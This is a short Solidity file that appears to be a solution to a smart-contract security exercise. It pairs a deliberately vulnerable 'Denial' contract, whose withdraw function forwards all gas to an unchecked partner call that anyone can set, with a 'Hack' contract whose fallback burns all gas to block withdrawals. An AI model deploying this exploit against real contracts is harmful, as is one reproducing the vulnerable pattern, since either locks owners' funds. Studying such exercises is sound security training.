// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDenial {
    function setWithdrawPartner(address) external;
}

contract Hack {
    constructor(IDenial target) {
        target.setWithdrawPartner(address(this));
    }

    fallback() external payable {
        // Burn all gas - same as assert(false) in Solidity < 0.8
        assembly {
            invalid()
        }
    }
}

contract Denial {

    address public partner; 
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; 

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }


    function withdraw() public {
        uint amountToSend = address(this).balance / 100;

        partner.call{value:amountToSend}("");
        payable(owner).transfer(amountToSend);

        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] +=  amountToSend;
    }


    receive() external payable {}


    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}